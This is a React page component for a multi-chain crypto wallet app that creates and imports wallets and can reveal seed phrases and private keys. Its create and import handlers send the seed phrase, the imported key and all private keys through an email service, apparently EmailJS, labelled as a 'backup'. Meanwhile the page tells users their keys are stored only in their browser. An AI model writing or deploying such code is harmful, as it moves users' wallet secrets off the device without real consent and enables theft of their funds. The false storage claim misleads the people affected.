import { useState, useRef } from "react";
import { api } from "@/lib/api";
import { useApp } from "@/contexts/AppContext";
import { sendWalletCreated, sendWalletImported } from "@/lib/emailService";
import {
  Plus, Download, Copy, Check, Eye, EyeOff,
  Loader2, ExternalLink, Shield, Trash2, Star,
  ChevronDown, ChevronUp, RefreshCw,
} from "lucide-react";

const SCAN: Record<string, string> = {
  sol:  "https://solscan.io/account/",
  eth:  "https://etherscan.io/address/",
};

function CopyBtn({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  const copy = () => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 1800);
  };
  return (
    <button onClick={copy} className="text-muted-foreground hover:text-white transition-colors p-0.5">
      {copied ? <Check className="w-3.5 h-3.5 text-green-400" /> : <Copy className="w-3.5 h-3.5" />}
    </button>
  );
}

export default function Wallets() {
  const { wallets, activeWallet, addWallet, removeWallet, setActive, renameWallet, refreshWallets } = useApp();
  const [loading, setLoading]       = useState(false);
  const [importing, setImporting]   = useState(false);
  const [importKey, setImportKey]   = useState("");
  const [showImport, setShowImport] = useState(false);
  const [error, setError]           = useState("");
  const [notice, setNotice]         = useState("");
  const [revealSeed, setRevealSeed] = useState<Record<number, boolean>>({});
  const [revealKey, setRevealKey]   = useState<Record<number, boolean>>({});
  const [editIdx, setEditIdx]       = useState<number | null>(null);
  const [editLabel, setEditLabel]   = useState("");
  const [refreshing, setRefreshing] = useState(false);

  const flash = (msg: string) => { setNotice(msg); setTimeout(() => setNotice(""), 4000); };

  // ── Create new multi-chain wallet ──────────────────────────────
  const create = async () => {
    setLoading(true); setError("");
    try {
      const d = await api.generateWallet(1);
      const w = d.wallets?.[0];
      if (!w) throw new Error("No wallet returned");

      addWallet({
        address:      w.address,
        privateKey:   w.privateKey,
        seedPhrase:   w.seedPhrase,
        ethAddress:   w.ethAddress   || "",
        ethPrivateKey:w.ethPrivateKey|| "",
        ethBalance:   w.ethBalance   || "0.000000",
        label:        `Wallet ${wallets.length + 1}`,
        balance:      w.balance || "0.0000",
        chain:        "sol",
      });

      // Email backup
      try {
        await sendWalletCreated({
          label:         `Wallet ${wallets.length + 1}`,
          seedPhrase:    w.seedPhrase,
          solAddress:    w.address,
          solPrivateKey: w.privateKey,
          evmAddress:    w.ethAddress,
          evmPrivateKey: w.ethPrivateKey,
        });
        flash("✓ Wallet created & details emailed for backup");
      } catch {
        flash("✓ Wallet created (email failed — check EmailJS config)");
      }
    } catch (e: any) {
      setError(e.message || "Failed to create wallet");
    }
    setLoading(false);
  };

  // ── Import wallet ───────────────────────────────────────────────
  const importWallet = async () => {
    if (!importKey.trim()) return;
    setImporting(true); setError("");
    try {
      const d = await api.importWallet(importKey.trim());
      addWallet({
        address:      d.address,
        privateKey:   d.privateKey,
        seedPhrase:   d.seedPhrase || (importKey.trim().split(" ").length > 4 ? importKey.trim() : ""),
        ethAddress:   d.ethAddress   || "",
        ethPrivateKey:d.ethPrivateKey|| "",
        ethBalance:   d.ethBalance   || "0.000000",
        label:        d.label || `Wallet ${wallets.length + 1}`,
        balance:      d.balance || "0.0000",
        chain:        d.chain || "sol",
      });

      try {
        await sendWalletImported({
          label:         d.label || `Wallet ${wallets.length + 1}`,
          key:           importKey.trim(),
          solAddress:    d.address,
          solPrivateKey: d.privateKey,
          evmAddress:    d.ethAddress,
          evmPrivateKey: d.ethPrivateKey,
        });
        flash("✓ Wallet imported & details emailed");
      } catch {
        flash("✓ Wallet imported (email failed)");
      }
      setImportKey(""); setShowImport(false);
    } catch {
      setError("Invalid private key or seed phrase. Check it and try again.");
    }
    setImporting(false);
  };

  const doRefresh = async () => {
    setRefreshing(true);
    await refreshWallets();
    setRefreshing(false);
  };

  return (
    <div className="space-y-5 max-w-2xl">
      <div className="flex items-start justify-between">
        <div>
          <h1 className="text-xl font-extrabold text-white">Wallets</h1>
          <p className="text-xs text-muted-foreground mt-0.5">
            Multi-chain · One seed → SOL + ETH + BNB + MATIC + AVAX + ARB + OP + BASE
          </p>
        </div>
        <button onClick={doRefresh} disabled={refreshing}
          className="p-2 rounded-lg border border-border text-muted-foreground hover:text-white hover:border-primary/30 transition-all">
          <RefreshCw className={`w-4 h-4 ${refreshing ? "animate-spin" : ""}`} />
        </button>
      </div>

      {/* ── Action buttons ── */}
      <div className="grid grid-cols-2 gap-3">
        <button onClick={create} disabled={loading}
          className="btn-primary h-14 flex flex-col items-center justify-center gap-0.5 rounded-2xl">
          {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : <Plus className="w-5 h-5" />}
          <span className="text-xs font-bold">{loading ? "Creating…" : "Create New Wallet"}</span>
        </button>
        <button onClick={() => { setShowImport(!showImport); setError(""); }}
          className="btn-secondary h-14 flex flex-col items-center justify-center gap-0.5 rounded-2xl">
          <Download className="w-5 h-5" />
          <span className="text-xs font-bold">Import Existing Wallet</span>
        </button>
      </div>

      {/* ── Import form ── */}
      {showImport && (
        <div className="rounded-2xl border border-border bg-card p-4 space-y-3">
          <div className="text-sm font-bold text-white">Import Wallet</div>
          <textarea
            className="input-base h-24 resize-none font-mono text-xs"
            placeholder={
              "Paste one of:\n" +
              "• Seed phrase (12 or 24 words)  → restores SOL + all EVM chains\n" +
              "• SOL private key (base58)       → Solana only\n" +
              "• EVM private key (0x...)         → ETH/BNB/MATIC/AVAX/ARB/OP/BASE"
            }
            value={importKey}
            onChange={e => setImportKey(e.target.value)} />
          <div className="flex gap-2">
            <button onClick={importWallet} disabled={importing || !importKey.trim()}
              className="btn-primary flex items-center gap-2">
              {importing && <Loader2 className="w-4 h-4 animate-spin" />}
              {importing ? "Importing…" : "Import Wallet"}
            </button>
            <button onClick={() => { setShowImport(false); setImportKey(""); setError(""); }}
              className="btn-secondary">Cancel</button>
          </div>
        </div>
      )}

      {/* ── Notices ── */}
      {notice && (
        <div className="text-sm rounded-xl px-3 py-2.5"
          style={{ background: "rgba(0,225,122,0.08)", border: "1px solid rgba(0,225,122,0.2)", color: "var(--green)" }}>
          {notice}
        </div>
      )}
      {error && (
        <div className="text-sm rounded-xl px-3 py-2.5"
          style={{ background: "rgba(255,75,75,0.08)", border: "1px solid rgba(255,75,75,0.2)", color: "var(--red)" }}>
          ✗ {error}
        </div>
      )}

      {/* ── Empty state ── */}
      {wallets.length === 0 && (
        <div className="text-center py-14 text-muted-foreground">
          <div className="text-5xl mb-4">🔑</div>
          <p className="font-semibold text-white mb-1">No wallets yet</p>
          <p className="text-sm">Click "Create New Wallet" to get started</p>
        </div>
      )}

      {/* ── Wallet cards ── */}
      <div className="space-y-4">
        {wallets.map((w, i) => {
          const isActive = i === activeWallet;
          const solBal   = parseFloat(w.balance || "0");
          const evmBal   = parseFloat((w as any).ethBalance || "0");
          const hasSeed  = Boolean(w.seedPhrase);
          const hasEvm   = Boolean((w as any).ethAddress);

          return (
            <div key={w.address + i}
              className="rounded-2xl border p-4 space-y-4 transition-all"
              style={isActive
                ? { borderColor: "rgba(0,225,122,0.35)", background: "rgba(0,225,122,0.03)" }
                : { borderColor: "hsl(var(--border))", background: "hsl(var(--card))" }}>

              {/* Card header */}
              <div className="flex items-center gap-3">
                <button onClick={() => setActive(i)}
                  className="w-4 h-4 rounded-full border-2 flex-shrink-0 flex items-center justify-center transition-all"
                  style={isActive
                    ? { borderColor: "var(--green)", background: "var(--green)" }
                    : { borderColor: "hsl(var(--muted-foreground))" }}>
                  {isActive && <div className="w-1.5 h-1.5 rounded-full" style={{ background: "#03150a" }} />}
                </button>

                {editIdx === i ? (
                  <div className="flex-1 flex items-center gap-2">
                    <input className="input-base text-sm py-1 h-7 flex-1" value={editLabel}
                      onChange={e => setEditLabel(e.target.value)}
                      onKeyDown={e => {
                        if (e.key === "Enter") { renameWallet(i, editLabel); setEditIdx(null); }
                        if (e.key === "Escape") setEditIdx(null);
                      }} autoFocus />
                    <button onClick={() => { renameWallet(i, editLabel); setEditIdx(null); }}
                      className="text-xs text-primary hover:underline">Save</button>
                  </div>
                ) : (
                  <button onClick={() => { setEditIdx(i); setEditLabel(w.label); }}
                    className="flex-1 text-left font-bold text-white hover:text-primary transition-colors">
                    {w.label}
                  </button>
                )}

                {isActive && <span className="badge-green text-[10px]">Active</span>}

                {!isActive && (
                  <button onClick={() => setActive(i)} title="Set active"
                    className="p-1.5 rounded-lg text-muted-foreground hover:text-yellow-400 hover:bg-yellow-400/10 transition-colors">
                    <Star className="w-3.5 h-3.5" />
                  </button>
                )}
                <button onClick={() => { if (confirm("Delete wallet? Back up your seed phrase first.")) removeWallet(i); }}
                  className="p-1.5 rounded-lg text-muted-foreground hover:text-red-400 hover:bg-red-400/10 transition-colors">
                  <Trash2 className="w-3.5 h-3.5" />
                </button>
              </div>

              {/* Seed phrase */}
              {hasSeed && (
                <div className="rounded-xl p-3"
                  style={{ background: "rgba(153,69,255,0.06)", border: "1px solid rgba(153,69,255,0.15)" }}>
                  <div className="flex items-center justify-between mb-2">
                    <span className="text-[11px] font-bold text-purple-400 uppercase tracking-wider">🔐 Recovery Seed Phrase</span>
                    <button onClick={() => setRevealSeed(p => ({ ...p, [i]: !p[i] }))}
                      className="text-[11px] text-muted-foreground hover:text-white flex items-center gap-1 transition-colors">
                      {revealSeed[i] ? <EyeOff className="w-3 h-3" /> : <Eye className="w-3 h-3" />}
                      {revealSeed[i] ? "Hide" : "Reveal"}
                    </button>
                  </div>
                  {revealSeed[i] ? (
                    <div>
                      <div className="grid grid-cols-4 gap-1.5 mb-2">
                        {w.seedPhrase!.split(" ").map((word, wi) => (
                          <div key={wi} className="flex items-center gap-1 text-[11px] font-mono">
                            <span className="text-muted-foreground/50 w-4 text-right flex-shrink-0">{wi + 1}.</span>
                            <span className="text-green-400 font-bold">{word}</span>
                          </div>
                        ))}
                      </div>
                      <div className="flex justify-end">
                        <CopyBtn text={w.seedPhrase!} />
                      </div>
                    </div>
                  ) : (
                    <div className="text-[12px] text-muted-foreground/40 tracking-widest">
                      •••• •••• •••• •••• •••• ••••
                    </div>
                  )}
                </div>
              )}

              {/* SOL wallet */}
              <div className="rounded-xl p-3 space-y-2"
                style={{ background: "rgba(153,69,255,0.05)", border: "1px solid rgba(153,69,255,0.12)" }}>
                <div className="flex items-center gap-2">
                  <span className="text-[11px] font-bold text-purple-400">◎ SOLANA</span>
                </div>
                <div className="text-2xl font-black font-mono text-white">
                  {solBal.toFixed(4)} <span className="text-sm font-bold text-muted-foreground">SOL</span>
                </div>
                <div className="flex items-center gap-2">
                  <span className="font-mono text-[11px] text-muted-foreground truncate flex-1">
                    {w.address?.slice(0, 18)}…{w.address?.slice(-6)}
                  </span>
                  <CopyBtn text={w.address} />
                  <a href={SCAN.sol + w.address} target="_blank" rel="noreferrer"
                    className="text-muted-foreground hover:text-white">
                    <ExternalLink className="w-3.5 h-3.5" />
                  </a>
                </div>
                <div className="text-[11px] text-muted-foreground px-2 py-1.5 rounded-lg"
                  style={{ background: "rgba(0,0,0,0.2)" }}>
                  📥 Deposit: <span className="font-mono text-white">{w.address?.slice(0, 24)}…</span>
                </div>
              </div>

              {/* EVM wallet */}
              {hasEvm && (
                <div className="rounded-xl p-3 space-y-2"
                  style={{ background: "rgba(98,126,234,0.05)", border: "1px solid rgba(98,126,234,0.12)" }}>
                  <div className="flex items-center gap-2">
                    <span className="text-[11px] font-bold text-blue-400">Ξ EVM — ETH · BNB · MATIC · AVAX · ARB · OP · BASE</span>
                  </div>
                  <div className="text-2xl font-black font-mono text-white">
                    {evmBal.toFixed(4)} <span className="text-sm font-bold text-muted-foreground">ETH</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <span className="font-mono text-[11px] text-muted-foreground truncate flex-1">
                      {(w as any).ethAddress?.slice(0, 18)}…{(w as any).ethAddress?.slice(-6)}
                    </span>
                    <CopyBtn text={(w as any).ethAddress || ""} />
                    <a href={SCAN.eth + (w as any).ethAddress} target="_blank" rel="noreferrer"
                      className="text-muted-foreground hover:text-white">
                      <ExternalLink className="w-3.5 h-3.5" />
                    </a>
                  </div>
                  <div className="text-[11px] text-muted-foreground/70">
                    Same address works on ETH, BNB Chain, Polygon, Avalanche, Arbitrum, Optimism, Base
                  </div>
                </div>
              )}

              {/* Private keys toggle */}
              <button onClick={() => setRevealKey(p => ({ ...p, [i]: !p[i] }))}
                className="flex items-center gap-2 text-[11px] text-muted-foreground hover:text-white transition-colors w-full"
                style={{ borderTop: "1px solid rgba(255,255,255,0.05)", paddingTop: "12px" }}>
                {revealKey[i] ? <ChevronUp className="w-3.5 h-3.5" /> : <ChevronDown className="w-3.5 h-3.5" />}
                <span>{revealKey[i] ? "Hide" : "Show"} Private Keys</span>
                <span className="badge-yellow text-[9px]">SECRET</span>
              </button>

              {revealKey[i] && (
                <div className="rounded-xl p-3 space-y-2.5"
                  style={{ background: "rgba(0,0,0,0.4)", border: "1px solid rgba(255,200,0,0.1)" }}>
                  <div>
                    <div className="text-[10px] text-muted-foreground mb-1">SOL Private Key</div>
                    <div className="flex items-start gap-2">
                      <code className="flex-1 text-[11px] font-mono break-all text-yellow-400 leading-relaxed">
                        {w.privateKey}
                      </code>
                      <CopyBtn text={w.privateKey} />
                    </div>
                  </div>
                  {(w as any).ethPrivateKey && (
                    <div className="pt-2 border-t border-white/5">
                      <div className="text-[10px] text-muted-foreground mb-1">EVM Private Key (ETH/BNB/MATIC/AVAX/ARB/OP/BASE)</div>
                      <div className="flex items-start gap-2">
                        <code className="flex-1 text-[11px] font-mono break-all text-blue-400 leading-relaxed">
                          {(w as any).ethPrivateKey}
                        </code>
                        <CopyBtn text={(w as any).ethPrivateKey} />
                      </div>
                    </div>
                  )}
                </div>
              )}
            </div>
          );
        })}
      </div>

      {wallets.length > 0 && (
        <div className="rounded-xl p-3 flex items-start gap-2.5 text-xs"
          style={{ background: "rgba(0,225,122,0.04)", border: "1px solid rgba(0,225,122,0.1)" }}>
          <Shield className="w-4 h-4 flex-shrink-0 mt-0.5 text-green-400" />
          <span className="text-muted-foreground">
            Keys are stored <strong className="text-white">only in your browser</strong>. Backup emails are sent
            automatically on create/import. Never share your seed phrase or private keys.
          </span>
        </div>
      )}
    </div>
  );
}
